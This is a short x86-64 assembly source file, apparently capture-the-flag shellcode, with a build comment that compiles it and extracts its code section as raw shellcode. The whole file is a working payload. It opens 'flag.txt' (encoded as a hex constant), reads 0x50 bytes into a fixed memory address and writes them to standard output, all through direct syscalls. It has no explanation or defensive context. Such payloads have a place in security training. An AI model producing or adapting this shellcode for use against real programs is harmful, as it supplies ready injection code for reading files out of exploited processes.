; gcc -nostdlib -static open-read-write.S -o program && objcopy program --dump-section .text=open-read-write-shellcode
.global _start
_start:
.intel_syntax noprefix
    mov al, 2
    xor esi, esi
    mov rdi, 0x7478742e67616c66
    push 0
    push rdi
    push rsp
    pop rdi
    syscall
    xchg eax, edi
    mov esi, 0x6001d0
    xor rdx, rdx
    mov dl, 0x50
    xor rax, rax
    syscall
    mov dil, 1
    mov dl, 0x50
    mov al, 1
    syscall
